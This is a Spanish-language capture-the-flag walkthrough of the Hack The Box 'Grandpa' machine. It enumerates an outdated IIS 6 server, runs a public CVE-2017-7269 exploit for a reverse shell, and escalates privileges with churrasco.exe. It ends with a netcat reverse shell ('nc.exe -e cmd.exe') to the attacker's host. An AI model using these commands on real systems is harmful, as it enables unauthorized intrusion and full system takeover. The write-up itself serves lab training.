# GRANDPA MACHINE

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/1.png)

## INDEX

- [[#ENUMERACION|ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
	- [[#FORMAS DE HACER BANNER GRABBING|FORMAS DE HACER BANNER GRABBING]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]
	- [[#OPCION 2|OPCION 2]]
- [[#NOTA|NOTA]]


## ENUMERACION

Vemos que puertos abiertos tiene

```
nmap -p- --opent -T5 -n -v 10.10.10.14 -oG allPorts
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/2.png)

vamos a enumerar los servicios:

```
nmap -p80 -sC -sV 10.10.10.14 -oN targeted
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/3.png)

vemos que tiene un IIS desactualizado, veamos la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/4.png)

nada interesante asi que vamos a ver si hay un exploit para esa version de IIS.

## EXPLOTACION

encontramos el siguiente exploit buscando a partir de un CVE que pertenecia a una vulnerabiliad en IIS 6:

- [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

lo ejecutamos:

```bash
python exploit.py 10.10.10.14 80 10.01.14.2 4545
```

nos colocamos en escucha en ese puerto y obtenemos una conexion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/5.png)

entramos como **nt authority\\network service**


## ELEVACION DE PRIVILEGIOS

al ver los privilegios que tenemos con ese usuario:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/6.png)

vemos que tenemos el **SeImpersonatePrivilege** habilitado, podriamos usar el **juicypotato**, pero estamos ante una version un poco antigua de windows:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/7.png)

el juicypotato nos dara problemas con esta version pues no la soporta, pero tenemos una alternativa descrita en este archiculo acerca de **churrasco.exe**:

- [https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

vamos a descargarlo desde este repositorio:

- [https://github.com/Re4son/Churrasco](https://github.com/Re4son/Churrasco)

y lo pasamos a la maquina victima por smbserver de impacket en **c:\\windows\\temp**

```bash
impacket-smbserver smbFolder $(pwd) smb2support
```

```bash
copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/8.png)

y lo ejecutamos:

```bash
churrasco.exe -d "whomai"
```

esto nos permite ejecutar comandos como administrador:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/9.png)

por lo que nos podemos pasar el netcat y pasarnos una shell con maximos privilegios:

```bash
churrasco.exe -d "C:\WINDOWS\Temp\chu\nc.exe -e cmd.exe 10.10.14.2 4242"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/10.png)

ya podemos ver las 2 flags:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/GRANDPA/images/11.png)


